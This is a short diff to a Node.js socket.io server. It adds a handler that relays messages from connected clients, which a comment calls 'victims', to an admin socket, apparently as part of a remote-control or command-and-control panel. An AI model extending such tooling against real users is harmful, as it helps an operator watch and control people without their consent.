@@ -22,6 +22,11 @@ module.exports.configure = function(io){
       adminSocket.emit('result', data)
     })
 
+    //forward messages from victims
+    socket.on('message', function(data){
+      adminSocket.emit('message', data)
+    })
+
     //when user disconnects, let admin know
     socket.on('disconnect', function(){
       disconnect(socket)
